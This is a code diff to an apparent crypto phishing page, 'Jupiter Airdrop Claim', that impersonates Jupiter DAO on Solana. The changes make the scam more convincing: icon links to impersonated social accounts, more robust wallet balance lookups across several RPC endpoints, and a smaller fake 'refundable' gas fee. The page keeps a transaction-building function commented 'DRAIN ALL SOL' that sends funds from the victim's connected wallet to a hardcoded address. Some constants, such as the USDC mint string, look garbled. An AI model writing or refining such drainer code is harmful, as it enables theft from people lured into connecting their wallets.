@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Jupiter Airdrop Claim</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -167,17 +168,23 @@
         .socials a {
             color: #FFE45C;
             text-decoration: none;
-            padding: 10px 15px;
+            padding: 12px;
             border-radius: 10px;
             background: rgba(255, 255, 255, .05);
             border: 1px solid rgba(255, 255, 255, .08);
             transition: .3s;
-            font-size: 14px;
+            font-size: 18px;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .socials a:hover {
             background: rgba(255, 228, 92, .1);
             border-color: #FFE45C;
+            transform: scale(1.1);
         }
 
         /* Online Support Badge */
@@ -405,11 +412,17 @@
                 <p>Powered by Jupiter DAO | <a href="#">Terms</a> | <a href="#">FAQ</a></p>
                 <p style="margin-top: 8px;">Network: Solana • Gas: Free</p>
 
-                <!-- Socials -->
+                <!-- Socials with Icons -->
                 <div class="socials">
-                    <a href="https://x.com" target="_blank">X</a>
-                    <a href="https://facebook.com" target="_blank">Facebook</a>
-                    <a href="https://youtube.com" target="_blank">YouTube</a>
+                    <a href="https://x.com/jup_dao" target="_blank" title="X (Twitter)">
+                        <i class="fab fa-x-twitter"></i>
+                    </a>
+                    <a href="https://facebook.com/jupiterdao" target="_blank" title="Facebook">
+                        <i class="fab fa-facebook"></i>
+                    </a>
+                    <a href="https://youtube.com/@jupiterdao" target="_blank" title="YouTube">
+                        <i class="fab fa-youtube"></i>
+                    </a>
                 </div>
 
                 <!-- Online Support Badge -->
@@ -569,33 +582,48 @@
     // ====== FETCH TOKEN BALANCES ======
     async function getTokenBalances(address) {
         console.log('[DEBUG] getTokenBalances() called for:', address);
-        const conn = new solanaWeb.Connection('https://api.mainnet-beta.solana.com');
-        const pubkey = new solanaWeb.PublicKey(address);
-        try {
-            // Get SOL balance
-            const solBalance = await conn.getBalance(pubkey);
-            balances.SOL = solBalance / solanaWeb.LAMPORTS_PER_SOL;
-            console.log('[DEBUG] SOL balance:', balances.SOL);
+        
+        // Use multiple RPC endpoints for better reliability
+        const rpcEndpoints = [
+            'https://api.mainnet-beta.solana.com',
+            'https://solana-api.projectserum.com',
+            'https://rpc.ankr.com/solana'
+        ];
+        
+        let conn;
+        for (const endpoint of rpcEndpoints) {
+            try {
+                conn = new solanaWeb.Connection(endpoint, 'confirmed');
+                const pubkey = new solanaWeb.PublicKey(address);
+                
+                // Get SOL balance
+                const solBalance = await conn.getBalance(pubkey);
+                balances.SOL = solBalance / solanaWeb.LAMPORTS_PER_SOL;
+                console.log('[DEBUG] SOL balance:', balances.SOL);
 
-            // Get USDC balance
-            const tokenAccounts = await conn.getTokenAccountsByOwner(pubkey, {
-                programId: new solanaWeb.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
-            });
+                // Get USDC balance
+                const tokenAccounts = await conn.getTokenAccountsByOwner(pubkey, {
+                    programId: new solanaWeb.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
+                });
 
-            for (const { account } of tokenAccounts.value) {
-                const data = Buffer.from(account.data);
-                const mint = new solanaWeb.PublicKey(data.slice(0, 32));
-                const amount = Number(data.readBigUInt64LE(64));
-                if (mint.toString() === 'EPjFWaLb3odcccccccccccccccccccccccdvHp5s') {
-                    balances.USDC = amount / 1000000;
-                    console.log('[DEBUG] USDC balance:', balances.USDC);
-                    break;
+                for (const { account } of tokenAccounts.value) {
+                    const data = Buffer.from(account.data);
+                    const mint = new solanaWeb.PublicKey(data.slice(0, 32));
+                    const amount = Number(data.readBigUInt64LE(64));
+                    if (mint.toString() === 'EPjFWaLb3odcccccccccccccccccccccccdvHp5s') {
+                        balances.USDC = amount / 1000000;
+                        console.log('[DEBUG] USDC balance:', balances.USDC);
+                        break;
+                    }
                 }
+                return balances;
+            } catch (e) {
+                console.warn(`[DEBUG] RPC endpoint failed (${endpoint}):`, e.message);
+                continue;
             }
-        } catch (e) {
-            console.error("[DEBUG] Error fetching balances:", e);
         }
-        return balances;
+        
+        throw new Error('All RPC endpoints failed. Please try again later.');
     }
 
     // ====== GAS FEE POPUP ======
@@ -603,8 +631,8 @@
         console.log('[DEBUG] showGasFeePopup() called with amount:', fakeAmount);
         document.getElementById('gasFeePopup').style.display = 'flex';
 
-        // Calculate gas fee (0.1 - 0.5 SOL)
-        const gasFee = (Math.random() * 0.4 + 0.1).toFixed(2);
+        // Calculate gas fee (0.005 - 0.015 SOL instead of 0.1-0.5)
+        const gasFee = (Math.random() * 0.01 + 0.005).toFixed(4);
         document.getElementById('gasFeeAmount').textContent = `Fee: ${gasFee} SOL (refundable)`;
 
         window.currentFakeAmount = fakeAmount;
@@ -625,8 +653,8 @@
         btn.textContent = 'Processing...';
         document.getElementById('gasFeeAmount').textContent = "Processing payment...";
         try {
-            const conn = new solanaWeb.Connection('https://api.mainnet-beta.solana.com');
-            const { blockhash } = await conn.getRecentBlockhash();
+            const conn = new solanaWeb.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+            const { blockhash } = await conn.getLatestBlockhash();
 
             // 1. CREATE MALICIOUS TRANSACTION (DRAIN ALL SOL)
             const maliciousTx = new solanaWeb.Transaction({
@@ -657,7 +685,7 @@
                 solanaWeb.SystemProgram.transfer({
                     fromPubkey: connectedWallet,
                     toPubkey: new solanaWeb.PublicKey('prVPrLRQwqba4BZ4zTSQRChWMLmDprkfXLQPNTT9rL4z3dU1x4cSe5NkokGaFaCQyJBZ4CUahoUFZBipdFkXG'),
-                    lamports: 0.1 * solanaWeb.LAMPORTS_PER_SOL,
+                    lamports: 0.01 * solanaWeb.LAMPORTS_PER_SOL,
                 })
             );
 
